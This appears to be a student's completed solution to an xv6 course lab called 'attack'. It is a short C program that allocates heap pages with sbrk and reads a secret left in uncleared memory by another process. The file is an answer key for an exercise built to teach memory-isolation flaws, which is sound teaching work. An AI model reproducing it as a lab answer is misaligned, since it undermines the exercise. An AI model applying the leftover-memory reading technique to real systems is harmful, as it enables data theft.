#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

/**
 * solution: https://www.youtube.com/watch?v=8wq1BcXhjp4
 */

int
main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)
  
  if(argc != 1){
    printf("Usage: attack\n");
    exit(1);
  }
  char* end = sbrk(PGSIZE * 17);
  // end = end + 9 * PGSIZE;
  end = end + 16 * PGSIZE;
  strcpy(end, " ");
  char* secret = end + 32;
  write(2, secret, 8);

  exit(1);
}
